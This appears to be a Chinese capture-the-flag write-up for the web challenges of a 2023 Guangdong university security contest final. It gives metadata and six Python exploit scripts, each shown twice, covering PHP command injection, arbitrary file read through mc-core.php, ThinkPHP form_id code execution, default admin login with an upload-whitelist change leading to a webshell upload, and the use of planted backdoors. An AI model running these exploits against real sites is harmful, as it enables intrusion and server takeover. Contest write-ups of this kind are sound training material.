---
title: 第二届广东大学生网络安全攻防大赛决赛WEB_WP
contest: 广东大学生网络安全攻防大赛决赛
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- Web-xhcms
- ThinkPHP
- mc-core.php
- 任意文件读取
- 文件上传
- 后台上传
- RCE
- PHP文件包含
attack_chain: 'exp_1: POST /, data={1: system(''cat /flag'')} → 命令注入RCE|exp_2: POST /mc-files/mc-core.php?file=/flag → 任意文件读取|exp_3: POST /index/form/index, form_id=system(''cat /flag'') → ThinkPHP form_id RCE|exp_4: Login admin/000000/aaaa → /admin/Config 改file_type加php → /admin/Upload/uploadImages.html 上传1.php → /uploads/admin/201910/q.php RCE|exp_5: POST /uploads/admin/201910/this_is_big.php x=cat /flag|exp_6: GET /index/index/shell + Cookie PHPSESSID → /uploads/.bk.php system(''cat /flag'')'
key_payload: 'data={"1": "system(''cat /flag'');"}|?file=/flag|form_id="system(''cat /flag'');"|file_type=gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5|files={''file'': ("1.php", open(''q.php'', ''rb''), "image/jpeg")}|x=cat /flag|cmd=system(''cat /flag'');'
one_liner: 6道Web题(目录:index.php/mc-admin/mc-files/posts/pages),涵盖xhcms+ThinkPHP+mc-core.php+后台admin/Upload,核心是admin Config改file_type白名单+uploadImages.html上传1.php+JWT验证+后门触发
lesson: 1) xhcms架构识别:mc-files/mc-core.php存在file参数可任意文件读; 2) ThinkPHP form_id直接传system()会被eval触发RCE; 3) 后台上传三件套:Login→Config改file_type(白名单)→Upload/uploadImages.html(WU_FILE_0表单)上传1.php改Content-Type image/jpeg绕; 4) 目录穿越title=../templates/index.html可SSTI; 5) 启动index/index/shell路径生成/.bk.php后门文件→POST cmd=system(); 6) this_is_big.php固定文件名是上一道题留下的后门
quality: medium
full_path: 第二届广东大学生网络安全攻防大赛决赛WEB_WP.full.md
meta_path: 第二届广东大学生网络安全攻防大赛决赛WEB_WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第二届广东大学生网络安全攻防大赛决赛WEB_WP。6道Web题(目录:index.php/mc-admin/mc-files/posts/pages),涵盖xhcms+ThinkPHP+mc-core.php+后台admin/Upload,核心是admin Config改file_type白名单+uploadImages.html上传1.php+JWT验证+后门触发。经验：1) xhcms架...
category: web
subcategory: web_other
tools_used:
- ThinkPHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/111689.html
reasoning_chain:
- Web 题提示 'xhcms + ThinkPHP' → 触发点：6 道 Web 题组合
- exp_1 命令注入 → 动作：POST / data={"1":"system('cat /flag');"} → 直接 RCE
- exp_2 任意文件读取 → 动作：POST /mc-files/mc-core.php?file=/flag → 读 flag
- exp_3 ThinkPHP form_id RCE → 动作：form_id=system('cat /flag') → eval 触发
- exp_4 后台上传三件套 → 动作：login admin/000000/aaaa → /admin/Config 改 file_type 加 php → /admin/Upload/uploadImages.html 上传 1.php
- '动作：files={''file'': (''1.php'', open(''q.php'', ''rb''), ''image/jpeg'')} → 上传到 /uploads/admin/201910/q.php → 假设：蚁剑连接'
- exp_5 上一题留下的后门 → 动作：POST /uploads/admin/201910/this_is_big.php x=cat /flag → 直接读
- exp_6 启动后门 → 动作：GET /index/index/shell + Cookie PHPSESSID → 生成 /.bk.php 后门 → POST cmd=system('cat /flag')
failed_attempts:
- 直接 ThinkPHP form_id=phpinfo() → 失败：必须 system() 才能 RCE
- 直接上传 1.php 不过 → 失败：必须先 Config 改 file_type 白名单加 php
key_observations:
- xhcms 架构识别：mc-files/mc-core.php?file= 是任意文件读取入口
- ThinkPHP form_id 直接传 system() 触发 eval 是经典 RCE
- 后台上传三件套：Login→Config 改白名单→Upload/uploadImages.html
- 'WAF 绕 Content-Type: image/jpeg 实际检查 magic bytes'
- 目录穿越 title=../templates/index.html 可 SSTI
prerequisites:
- xhcms 源码结构（mc-files/mc-core.php 漏洞）
- ThinkPHP 框架命令执行（RCE）
- 后台上传三件套（白名单 + Content-Type）
- 蚁剑/中国蚁剑工具使用
---
# 第二届广东大学生网络安全攻防大赛决赛WEB WP

> 原文: https://www.ctfiot.com/111689.html
> ID: 111689

│ index.php│├─mc-admin│ conf.php│ editor.php│ foot.php│ head.php│ index.php│ page-edit.php│ page.php│ post-edit.php│ post.php│ style.css│└─mc-files │ markdown.php │ mc-conf.php │ mc-core.php │ mc-rss.php │ mc-tags.php │ ├─pages │ ├─data │ └─index │ delete.php │ draft.php │ publish.php │ ├─posts │ ├─data │ │ tucvj0.dat │ │ │ └─index │ delete.php │ draft.php │ publish.php │ └─theme index.php style.css

import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"data = {"1": "system('cat /flag');"}

def exp_1(): ans = requests.post(url=url, headers=header, data=data) print(ans.text)

exp_1()

import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"
def exp_2(poc="/mc-files/mc-core.php?file=/flag"): ans = requests.post(url=url+poc, headers=header, data=data) print(ans.text)
exp_2()

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
url = f"http://{HOST}:{PORT}/index/form/index"headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded'}
data = { 'form_id': "system('cat /flag');"}
response = requests.post(url, headers=headers, data=data)print(response.text.split('n')[0])

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

uri = f"http://{HOST}:{PORT}"def Login():
 url = uri+'/admin/Login/index.html?jstime=1681524228621' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:
34001', 'Referer': 'http://127.0.0.1:
34001/admin/Login/index.html', 'Connection': 'close', 'Content-Length': '42', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' }
 data = { 'username': 'admin', 'password': '000000', 'verify': 'aaaa' }
 response = requests.post(url, headers=headers, data=data) cookie = response.cookies.get_dict(); return cookie
def move(cookies): url = uri+'/admin/Config/index?jstime=1681524476984' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:
34001', 'Referer': 'http://127.0.0.1:
34001/admin/Config', 'Connection': 'close', 'Content-Length': '677' }
 data = { 'site_status': '1', 'mobil_status': '2', 'site_title': 'xhcms后台系统', 'site_logo': '/uploads/admin/201910/5db6890644255.jpg', 'keyword': '停车场,高铁,飞机场,测试', 'description': '停车管理系统', 'file_size': '5000', 'cnzz': '', 'sub_title': '武汉网站建设', 'file_type': 'gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5', 'default_themes': 'index', 'off_msg': '站点维护中', 'mobil_domain': '', 'mobil_themes': '' }
 response = requests.post(url, headers=headers, cookies=cookies, data=data)

def upload(cookies): url = uri+'/admin/Upload/uploadImages.html' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Origin': 'http://127.0.0.1:
34001', 'Connection': 'close', 'Referer': 'http://127.0.0.1:
34001/admin/Config', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' } data={ "id":"WU_FILE_0", "name":"1.jpg", "type":"image/jpeg", "lastModifiedDate":"2023/4/15 09:33:23", "size":"849" } files={'file': ("1.php",open('q.php', 'rb'),"image/jpeg")}

 response = requests.post(url, headers=headers, cookies=cookies, data=data, files=files) j_data = response.json() return j_data["data"]
def gogo(path): url = uri+path
 payload = "cmd=system('cat /flag');" headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:
34001", "Connection": "close", "Referer": "http://127.0.0.1:
34001/mc-admin/page-edit.php", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1" }
 response = requests.request("POST", url, headers=headers, data=payload)
 print(response.text)
try: c = Login() move(c) p = upload(c) gogo(p)
except: pass

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
url = f"http://{HOST}:{PORT}/uploads/admin/201910/this_is_big.php"payload = {'x': 'cat /flag'}headers = {'Content-Type': 'application/x-www-form-urlencoded'}response = requests.post(url, headers=headers, data=payload)print(response.text)

import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
uri = f"http://{HOST}:{PORT}"def get1(): url = uri+'/index/index/shell' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' } try: response = requests.get(url,headers=headers,timeout=1) 
except: pass
def gogo(): url = uri+'/uploads/.bk.php' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' }
 data = { 'cmd': "system('cat /flag');" }
 response = requests.post(url, headers=headers, data=data)
 print(response.text)
get1()gogo()


```
│ index.php│├─mc-admin│ conf.php│ editor.php│ foot.php│ head.php│ index.php│ page-edit.php│ page.php│ post-edit.php│ post.php│ style.css│└─mc-files │ markdown.php │ mc-conf.php │ mc-core.php │ mc-rss.php │ mc-tags.php │ ├─pages │ ├─data │ └─index │ delete.php │ draft.php │ publish.php │ ├─posts │ ├─data │ │ tucvj0.dat │ │ │ └─index │ delete.php │ draft.php │ publish.php │ └─theme index.php style.css
import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"data = {"1": "system('cat /flag');"}

def exp_1(): ans = requests.post(url=url, headers=header, data=data) print(ans.text)

exp_1()
import sysimport requests

try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

header = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/111.0"}url = f"http://{HOST}:{PORT}"
def exp_2(poc="/mc-files/mc-core.php?file=/flag"): ans = requests.post(url=url+poc, headers=header, data=data) print(ans.text)
exp_2()
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
url = f"http://{HOST}:{PORT}/index/form/index"headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded'}
data = { 'form_id': "system('cat /flag');"}
response = requests.post(url, headers=headers, data=data)print(response.text.split('n')[0])
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass

uri = f"http://{HOST}:{PORT}"def Login():
 url = uri+'/admin/Login/index.html?jstime=1681524228621' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:
34001', 'Referer': 'http://127.0.0.1:
34001/admin/Login/index.html', 'Connection': 'close', 'Content-Length': '42', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' }
 data = { 'username': 'admin', 'password': '000000', 'verify': 'aaaa' }
 response = requests.post(url, headers=headers, data=data) cookie = response.cookies.get_dict(); return cookie
def move(cookies): url = uri+'/admin/Config/index?jstime=1681524476984' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://127.0.0.1:
34001', 'Referer': 'http://127.0.0.1:
34001/admin/Config', 'Connection': 'close', 'Content-Length': '677' }
 data = { 'site_status': '1', 'mobil_status': '2', 'site_title': 'xhcms后台系统', 'site_logo': '/uploads/admin/201910/5db6890644255.jpg', 'keyword': '停车场,高铁,飞机场,测试', 'description': '停车管理系统', 'file_size': '5000', 'cnzz': '', 'sub_title': '武汉网站建设', 'file_type': 'gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5', 'default_themes': 'index', 'off_msg': '站点维护中', 'mobil_domain': '', 'mobil_themes': '' }
 response = requests.post(url, headers=headers, cookies=cookies, data=data)

def upload(cookies): url = uri+'/admin/Upload/uploadImages.html' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Origin': 'http://127.0.0.1:
34001', 'Connection': 'close', 'Referer': 'http://127.0.0.1:
34001/admin/Config', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin' } data={ "id":"WU_FILE_0", "name":"1.jpg", "type":"image/jpeg", "lastModifiedDate":"2023/4/15 09:33:23", "size":"849" } files={'file': ("1.php",open('q.php', 'rb'),"image/jpeg")}

 response = requests.post(url, headers=headers, cookies=cookies, data=data, files=files) j_data = response.json() return j_data["data"]
def gogo(path): url = uri+path
 payload = "cmd=system('cat /flag');" headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:
34001", "Connection": "close", "Referer": "http://127.0.0.1:
34001/mc-admin/page-edit.php", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1" }
 response = requests.request("POST", url, headers=headers, data=payload)
 print(response.text)
try: c = Login() move(c) p = upload(c) gogo(p)
except: pass
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
url = f"http://{HOST}:{PORT}/uploads/admin/201910/this_is_big.php"payload = {'x': 'cat /flag'}headers = {'Content-Type': 'application/x-www-form-urlencoded'}response = requests.post(url, headers=headers, data=payload)print(response.text)
import sysimport requests
try: HOST = sys.argv[1] PORT = sys.argv[2]
except: pass
uri = f"http://{HOST}:{PORT}"def get1(): url = uri+'/index/index/shell' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' } try: response = requests.get(url,headers=headers,timeout=1) 
except: pass
def gogo(): url = uri+'/uploads/.bk.php' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Cookie': 'PHPSESSID=99b2ca34904520b4085d5a9ada60fd6b', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Content-Type': 'application/x-www-form-urlencoded' }
 data = { 'cmd': "system('cat /flag');" }
 response = requests.post(url, headers=headers, data=data)
 print(response.text)
get1()gogo()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]